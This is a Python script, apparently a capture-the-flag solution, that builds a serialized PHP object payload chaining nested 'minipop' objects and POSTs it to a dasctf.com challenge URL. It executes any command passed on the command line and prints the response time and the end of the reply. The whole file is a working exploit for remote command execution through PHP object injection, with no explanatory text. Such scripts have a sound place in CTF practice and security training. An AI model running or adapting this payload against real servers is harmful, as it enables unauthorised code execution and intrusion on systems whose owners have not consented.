#!/usr/bin/env python3
import sys
import time
import urllib.parse
import urllib.request


URL = "http://da3ad6c0779bc43e7d2b1407.http-ctf2.dasctf.com/"


def s(value: str) -> str:
    return f's:{len(value)}:"{value}";'


def payload(command: str) -> str:
    prop = 's:13:"qwejaskdjnlka";'
    return (
        'O:7:"minipop":2:{'
        's:4:"code";N;'
        f'{prop}O:7:"minipop":2:{{'
        f's:4:"code";{s(command)}'
        f'{prop}N;'
        '}}'
    )


def main() -> int:
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} COMMAND", file=sys.stderr)
        return 2
    command = " ".join(sys.argv[1:])
    data = urllib.parse.urlencode({"payload": payload(command)}).encode()
    req = urllib.request.Request(URL, data=data, method="POST")
    start = time.monotonic()
    with urllib.request.urlopen(req, timeout=20) as resp:
        body = resp.read().decode("utf-8", "replace")
    elapsed = time.monotonic() - start
    print(f"elapsed={elapsed:.3f}s bytes={len(body)}")
    print(body[-200:])
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
